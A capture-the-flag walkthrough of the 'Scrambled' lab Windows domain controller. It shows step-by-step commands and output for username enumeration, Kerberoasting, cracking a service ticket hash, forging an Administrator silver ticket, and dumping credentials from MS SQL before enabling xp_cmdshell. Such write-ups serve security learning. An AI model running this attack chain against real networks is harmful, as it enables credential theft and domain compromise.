# Scrambled

## Summary

Nmap finds a website on port `80` and shows Kerberos is running on port `88`. It also displays a few domains (`scrm.local` and `dc1.scrm.local`), which we add to `/etc/hosts`. The website reveals several important pieces of information: 1) NTLM authentication is disabled, 2) `ksimpson` is a valid username, 3) a unique program runs on port `4411` and has some debug mode, and 4) passwords are reset to match the account username. We learn that the credentials `ksimpson:ksimpson` are valid using [kerbrute](https://github.com/ropnop/kerbrute). However, `ksimpson` has limited privileges and cannot do much, so we need to [attack Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology).

We are able to access some of the SMB shares as `ksimpson` using Kerberos to authenticate ([smbclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) from [impacket](https://github.com/SecureAuthCorp/impacket) supports this). We find a PDF mentioning how passwords are stored in a database. So, it looks like MS SQL is our target.

We use the [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) attack ([more information](https://www.tarlogic.com/blog/how-to-attack-kerberos/#Kerberoasting), [video by the author of the box](https://www.youtube.com/watch?v=xH5T9-m9QXw)). We use [impacket](https://github.com/SecureAuthCorp/impacket) to get the Service Principal Names (SPNs), which gives us the Ticket Granting Service (TGS) for the `sqlsvc` user. We crack the hash following the [HackTricks Kerberoast section on cracking](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#cracking) and get a password. Next,  we use the [Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#silver-ticket) attack to forge a custom TGS as the `Administrator` user, which will definitely have access to the database. With this ticket, we can use [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) and enumerate the database. We find the credentials for the `MiscSvc` user. Finally, we use [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [xp_cmdshell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#mssqlclient.py) to get a reverse shell.

We easily switch to the `MiscSvc` user since we have the credentials for it using`Invoke-Command` and grabbing another reverse shell. This gets us the `user.txt` flag. At the path `C:\Shares\IT\Apps\Sales Order Client` we find an executable and a DLL. We download them both and open them in [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy), a .Net decompiler. We find a deserialization vulnerability in the `ScrambleLib.ScrambleNetClient.UploadOrder` function and use [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) to exploit the deserialization vulnerability. This program creates a payload that will run our reverse shell command. We send the payload to the program on port `4411` with the `UPLOAD_ORDER;` command. After several attempts, we get a reverse shell as `Administrator` and get the `root.txt` flag.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.168 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.168`.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-03 17:35:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-03T17:38:16+00:00; -3s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-03T17:38:16+00:00; -3s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-03T04:55:14
|_Not valid after:  2052-08-03T04:55:14
|_ssl-date: 2022-08-03T17:38:16+00:00; -3s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-03T17:38:16+00:00; -3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-03T17:38:16+00:00; -3s from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
53525/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=8/3%Time=62EAB1D1%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW
SF:N_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLSS
SF:essionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourOh
SF:FourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;
SF:\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk-
SF:RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-08-03T17:37:41
|_  start_date: N/A
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
```

Let's add all the detected domains (and `scrambled.htb` just in case) to our `/etc/hosts` file: `echo "10.10.11.168 scrambled.htb scrm.local dc1.scrm.local" | sudo tee -a /etc/hosts`.

Important to note is that we have a website on port `80` and Kerberos is active on the machine on port `88`.

### Port `80`

Let's first check out the website on port `80`:

![](screenshots/Screenshot%202022-08-03%20at%2019-49-06%20Scramble%20Corp%20Intranet.png)

On the "IT Services" page we see that they have disabled NTLM authentication on their network due to a security breach:

![](screenshots/Screenshot%202022-08-03%20at%2019-49-57%20IT%20Services.png)

The page also links to several resources that reveal some important information.

On the "Contacting IT Support" page below, we get a username, `ksimpson`, and an internal phone number, `0866`:

![](screenshots/Screenshot%202022-08-03%20at%2019-50-04%20Support%20Tickets.png)

The "New User Account" page doesn't seem to be that useful:

![](screenshots/Screenshot%202022-08-03%20at%2019-50-17%20New%20User.png)

The "Sales Orders App Troubleshooting" page discusses a program that connects to port `4411` and has a debugging mode:

![](screenshots/Screenshot%202022-08-03%20at%2019-50-24%20Sales%20Orders%20App%20Troubleshooting.png)

Finally, the "Password Resets" page explains that their password reset system is currently down:

![](screenshots/Screenshot%202022-08-03%20at%2019-50-35%20Password%20Resets.png)

So, if someone needs their password reset, they should contact IT and IT will reset it to be the same as their username. Thus, for any usernames we get, we can guess that the password is the same as the username.

We already know about the `ksimpson` user from a screenshot. So, maybe their password is also `ksimpson`.

We can quickly test this using [kerbrute](https://github.com/ropnop/kerbrute): `echo "ksimpson:ksimpson" > creds.txt && ./kerbrute bruteforce --domain scrm.local --dc dc1.scrm.local creds.txt && rm creds.txt`:

```
2022/08/03 20:43:41 >  Using KDC(s):
2022/08/03 20:43:41 >   dc1.scrm.local:88

2022/08/03 20:43:41 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2022/08/03 20:43:41 >  Done! Tested 1 logins (1 successes) in 0.132 seconds
```

In our command we put the credentials in a file, tell `kerbrute` to read credentials from that file, and then we remove the file when `kerbrute` is done. Apparently, `kerbrute` can read from STDIN, but I couldn't get that to work.

The `kerbrute` program is meant for bruteforcing usernames and passwords against kerberos. Kerberos is a great target to bruteforce credentials because 1) it will indicate if a username is correct even if the password is wrong, 2) "Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625)" so it is stealthy, and 3) it can be done quickly.

### Kerberos

We are just using `kerbrute` to check for a single credential combination, but we can run `kerbrute userenum -d scrm.local --dc dc1.scrm.local A-ZSurnames.txt` to check if any of the users in the `A-ZSurnames.txt` list are present on the target machine. Searching for "kerberos usernames list" finds [attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists), which has plenty of options. We use the [A-ZSurnames.txt](https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt) list because that is the format of the `ksimpson` username we found. Running the aforementioned commands produces this output:

```
2022/08/03 21:04:55 >  [+] VALID USERNAME:       ASMITH@scrm.local
2022/08/03 21:05:07 >  [+] VALID USERNAME:       JHALL@scrm.local
2022/08/03 21:05:08 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2022/08/03 21:05:09 >  [+] VALID USERNAME:       KHICKS@scrm.local
2022/08/03 21:05:19 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2022/08/03 21:05:29 >  Done! Tested 13000 usernames (5 valid) in 34.980 seconds
```

We could then bruteforce passwords for each user using the `bruteuser` command from `kerbrute`, but we already have a set of credentials.

**Resources:** The [HackTricks Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology) is a great guide to working with Windows Active Directories. Additionally, [Kerberos (I): How does Kerberos work? – Theory](https://www.tarlogic.com/blog/how-kerberos-works/) is a fantastic introduction to Kerberos from BlackArrow. Finally, [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos) explains some of the common Kerberos attacks/exploits.

Another resource is [WADComs](https://wadcoms.github.io), which shows commands regarding Active Directory applicable to your current situation. For instance, if we [select the options for our current setup](https://wadcoms.github.io/#+Username+Password+Exploitation+Windows+Kerberos), we will get a list of commands that might be useful.

We initially try using [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec) to see if we can access anything using the `ksimpson` user. For instance, we run `crackmapexec winrm scrm.local -u ksimpson -p ksimpson` to check if we can connect over [WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm). Testing all of `crackmapexec`'s [supported protocols](https://wiki.porchetta.industries/getting-started/selecting-and-using-a-protocol#viewing-available-protocols) fails with our credentials though, so we need a more privileged account.

In the [Enumerating Active Directory WITH credentials/session](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session) section, HackTricks tells us that we can obtain all the domain usernames by running `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` (from [impacket](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_10_0/examples/GetADUsers.py)). However, when we run it, we get this issue:

```
$ GetADUsers.py -all -dc-ip 10.10.11.168 scrm.local/ksimpson
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password:
[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 1, v4563
```

The website mentioned that NTLM is disabled, so it looks like we are going to need to explore Kerberos more.

### SMB

As the `ksimpson`, user we are able to get a TGT (Ticket Granting Ticket) by running `getTGT.py scrm.local/ksimpson:ksimpson` (from [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)). Run `export KRB5CCNAME=ksimpson.ccache` so future scripts know which ticket to use. Then, we can run `smbclient.py -k -no-pass scrm.local/ksimpson@dc1.scrm.local` to authenticate to the SMB share using Kerberos. Alternatively, just run `smbclient.py -k scrm.local/ksimpson@dc1.scrm.local` and provide the password `ksimpson`:

```
Password:
[-] CCache file is not found. Skipping...
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)


# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use Sales
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
# Bye!
```

We do not have access to the `Sales` share, so we should note that for later. In the `Public` share there is a document: [Network Security Changes.pdf](Network%20Security%20Changes.pdf). The document says "The attacker was able to retrieve credentials from an SQL database used by our HR software so we have removed all access to the SQL service for everyone apart from network administrators." Sounds like there are still credentials in the database then. So, that should be our target.

## Foothold

The next attack we see is [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) (also shown on [WADComs with the `Impacket-GetUserSPNs` command](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/) and from [the article linked previously](https://www.tarlogic.com/blog/how-to-attack-kerberos/#Kerberoasting)).

Additionally, searching for "kerberoasting" finds a [video by the author of the box](https://www.youtube.com/watch?v=xH5T9-m9QXw). The video is actually pretty helpful for understanding how this attack works.

"The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline." - [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#kerberoast)

Running the command as shown in HackTricks or WADComs produes this error:

```
$ GetUserSPNs.py -request -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson -outputfile hashes.kerberoast
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 1, v4563
```

So, we add the `-k` option to use Kerberos, which then tells us to use the `-dc-host` option instead of `-dc-ip`.

So, our final command is `GetUserSPNs.py -request -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -outputfile hashes.kerberoast -k`:

```
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2022-08-03 00:55:12.319018
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2022-08-03 00:55:12.319018



[-] CCache file is not found. Skipping...
```

Note: If the above produces a `TypeError: exceptions must be old-style classes or derived from BaseException, not str` issue, then check out [impacket#1206](https://github.com/SecureAuthCorp/impacket/issues/1206).

This seems to work for me. Running `cat hashes.kerberoast` gives us a hash:

```
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$62652d40a4f179320c4d55b5ac836f28$7165c7282c021132da52b0c079622628e5367c7f0a0f726be11c9d9ba9f7221f09bfe4449f15ff2ab40ee9836cfc19094e32c3eb2ffdc2e320baca8def1cd25889279a7ea5995017835606e040cf28560a7c96244a453f5f3cae4d524c184b6bee280c84ac0134955ee2321fb60ee2fe3d98585497b9f1e836b2b733ac6e4f3de9b4efc3d207706021049e9ab8e47db1effe066820b21d8c3cda291d832fa93406e62eda70c8b812c675b5650b0b2089e6e822c09f43928277a95c19a728a93f0b7b5ef0ba0fb9333eeb48e17837c1ee909d0eb16e195251c8172e605e7bd38060928929c61ae88161ee0df44bc031bec07e59bb455e88ac8d948d8b73930f9d409db147ce42d3f7b8e2c69e2235342db166fc21291db27b8ad66336413ce3de81f318ebd5c44671a859c6fa5555aefddca90275b867f03d0b9676df9ba80c04e4e058e84b87a05b84ad905679696566017cd8114f4dff2ff2659463c145740c00215b90e8defa2c60daca0f5af24b3deea4226440672224323dac1a0ca561662c3c6341257c03885efe9b4e82e5d9f451b726352bb8ed885a133af6e444918f294b1cddcd3e2b6e74e173d79c1461e84236b19d91873a9dedcc5910462b1d53bde5fbf0ce9030453e113f392bb13243f006e199adbba639b4bbbdd7e71ad163ed29045ad71f9c15dbe8fb8d40b56126b2ebb77185c44228c3db3c59514eef3d4969d59166a97ba78142106d2fa27540cba018e6cc2fe40286610e6f89a809cda4f29e27e92faef49b1caed3d1695fed5b8569860a6ba21cf3e3e51acb3b3418ea06f5bf97b3967c03841f030c9f0e2d2cec17cead6c7da5e15cb08e6ec6ef2c5c26cf1625707be28ec7f4ed9b6ba81d0d50114a583e5a44d0bec84c7004702789918fa9c3aa5ff9eb0f43e67a2958da337753895da4b2f9619b010f456848be5676cfe6ce7c1d78015c8b30f4f3599e76a613b0375a748620fef3c24d42da1df332f9f519fb4e9e0f8daa942328c7ab8ee6e07a7f0feb821885648683dd2b7c20c85668c79077c954f2a9fe58956c8cb6e03552f466cadf13ed9b7e7839e388f4b70ee6a8c149ce047a893778941d68974d0635ac13ced1fbf136a48e8a8e124b4aea4ee36b694c92d150d4f55cb1eaa43857dcd5467d904cc3b3ac6db5964480f9c4753ef35404ddbd719e4d9b9839e1aacf94e902bd7cf4bdec9fcbe74df190d2bd0872ee4b4833b96b7e7525b861acaf07f1cbfdc681b44791dcac5479834a31daa49b552fdc625dcae480553b3781f0ac0f0ceb56c1501a53a5f0175c6c9de85d4a410dda5d5ee6ae4b99e96ae132b86dc78c2ec8dacffc07a88910229a61cdf7e5c874987d2cce142885b6bd4693d45ae2e6d76718ed59a5c9ea3346953ab7d32af92fa096be39d884634f602e8f69a1dccd257daf229eb7
```

So, we have the TGS (Ticket Granting Service) for the `sqlsvc` user. The TGS "is the ticket which user can use to authenticate against a service. It is encrypted with the service key" ([source](https://www.tarlogic.com/blog/how-kerberos-works/)). Now, we can try to crack the TGS to get the key.

According to the [HackTricks Kerberoast section on cracking](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#cracking), we can run `john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast` to crack the hash. Within a few seconds this gives us the password `Pegasus60`.

On HackTricks, we look at the [Post-exploitation with high privilege account](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#post-exploitation-with-high-privilege-account) section, which talks about the [Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#silver-ticket) attack: "The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user (like privileged access to a computer)."

We have the password for the `sqlsvc` account. So, we can easily [get an NTLM hash](https://codebeautify.org/ntlm-hash-generator) of that password: `B999A16500B87D17EC7F2E2A68778F05`. Since we have the NTLM hash of the MS SQL service, we can use the silver ticket attack to forge a custom TGS as the Administrator user, which will definitely have access to the database.

We can run `export KRB5CCNAME=sqlsvc.ccache` and then `secretsdump.py -k -no-pass scrm.local/sqlsvc@dc1.scrm.local -debug` to get the domain SID:

```
[+] Using Kerberos Cache: sqlsvc.ccache
[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at SCRM.LOCAL
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_CCQuQPwx
[+] Trying to connect to KDC at SCRM.LOCAL
[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500
[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a}
```

So, the domain SID is `S-1-5-21-2743207045-1827831105-2542523200`. The exmaple command from [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#silver-ticket) is `python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus`.

For us, the command will be `ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn mssqlsvc/dc1.scrm.local Administrator`:

```

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Now, we can access the MS SQL server by running `export KRB5CCNAME=Administrator.ccache` and `mssqlclient.py -k -no-pass dc1.scrm.local`:

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

To enumerate the database, we use the same commands as in the [StreamIO writeup](../StreamIO/README.md).

```
SQL> SELECT name FROM master.dbo.sysdatabases
name                                                                                                 

--------------------------------------------------------------------------------------------------------------------------------

master                                                                                               

tempdb                                                                                               

model                                                                                                

msdb                                                                                                 

ScrambleHR                                                                                           

SQL> use scramblehr;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA                                                                                                                       TABLE_NAME                                                                                                                         TABLE_TYPE 

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ---------- 

ScrambleHR                                                                                                                         dbo                                                                                                                                Employees                                                                                                                          b'BASE TABLE'

ScrambleHR                                                                                                                         dbo                                                                                                                                UserImport                                                                                                                         b'BASE TABLE'

ScrambleHR                                                                                                                         dbo                                                                                                                                Timesheets                                                                                                                         b'BASE TABLE'

SQL> SELECT * from UserImport;
LdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups

--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------

MiscSvc                                              ScrambledEggs9900                                    scrm.local                                                        90               0

SQL>
```

Now, we have `MiscSvc:ScrambledEggs9900` as credentials.

We gain command execution using [xp_cmdshell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#mssqlclient.py):

```
SQL> enable_xp_cmdshell
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

